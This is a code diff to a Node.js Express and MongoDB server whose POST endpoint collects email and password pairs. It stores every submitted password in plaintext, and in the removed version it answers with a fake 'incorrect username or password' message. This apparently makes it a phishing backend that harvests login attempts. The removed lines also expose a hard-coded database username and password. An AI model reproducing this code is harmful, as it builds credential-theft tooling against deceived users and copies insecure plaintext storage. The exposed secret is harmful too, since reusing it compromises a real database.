@@ -1,7 +1,7 @@
 const express = require('express');
 const mongoose = require('mongoose');
 const cors = require('cors');
-const User = require('./models/User');
+const User = require('./models/User'); // Ensure this path is correct
 
 const app = express();
 const PORT = process.env.PORT || 3000;
@@ -9,7 +9,8 @@ const PORT = process.env.PORT || 3000;
 app.use(express.json());
 app.use(cors());
 
-mongoose.connect('mongodb+srv://jembex:qwerty4747@cluster0.lyarq5l.mongodb.net/Node-API?retryWrites=true&w=majority&appName=Cluster0')
+// IMPORTANT CHANGE: Use process.env.MONGODB_URI for the connection string
+mongoose.connect(process.env.MONGODB_URI)
   .then(() => {
     console.log('MongoDB Connected');
   })
@@ -27,26 +28,20 @@ app.post('/', async (req, res) => {
   }
 
   try {
-    // Check if user already exists
     let existingUser = await User.findOne({ email });
 
     if (existingUser) {
-      // If user exists, add the new password to their existing passwords array
-      // Only add if the password isn't already present to avoid duplicates in the array
       if (!existingUser.password.includes(password)) {
         existingUser.password.push(password);
         await existingUser.save();
-        //User already exists. New password added successfully! 
-        return res.status(200).json({ message: 'Incorect username or password! ' });
+        return res.status(200).json({ message: 'User already exists. New password added successfully!' });
       } else {
-        //User already exists and this password is already associated.
-        return res.status(200).json({ message: 'Incorect username or password.' });
+        return res.status(200).json({ message: 'User already exists and this password is already associated.' });
       }
     } else {
-      // If user does not exist, create a new user with the password as an array
       const newUser = new User({
         email,
-        password: [password], // Store as an array with the first password
+        password: [password],
       });
 
       const savedUser = await newUser.save();
@@ -63,7 +58,6 @@ app.post('/', async (req, res) => {
 app.get('/users', async (req, res) => {
   try {
     const users = await User.find({});
-    // Project necessary fields, excluding password array from direct client view in production
     const usersSafeData = users.map(user => ({ id: user._id, email: user.email, createdAt: user.createdAt, passwordsCount: user.password.length }));
     res.json(usersSafeData);
   } catch (err) {
